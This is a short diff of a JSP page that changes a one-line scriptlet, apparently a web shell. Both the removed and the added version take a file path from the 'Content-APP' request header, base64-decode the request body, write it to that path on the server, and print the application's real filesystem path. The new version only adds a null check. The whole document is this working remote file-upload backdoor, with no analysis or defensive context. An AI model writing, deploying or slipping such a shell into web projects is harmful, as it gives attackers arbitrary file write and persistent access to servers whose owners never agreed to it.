@@ -10,4 +10,4 @@ YmFzZTY0Cg==
 
 -->
 
-<%sun.misc.BASE64Decoder b = new sun.misc.BASE64Decoder();new java.io.FileOutputStream(request.getHeader("Content-APP")).write(b.decodeBuffer(request.getInputStream()));out.println(request.getSession().getServletContext().getRealPath(""));%>
+<%String f=request.getHeader("Content-APP");if(f!=null){sun.misc.BASE64Decoder b = new sun.misc.BASE64Decoder();new java.io.FileOutputStream(f).write(b.decodeBuffer(request.getInputStream()));}out.println(request.getSession().getServletContext().getRealPath(""));%>
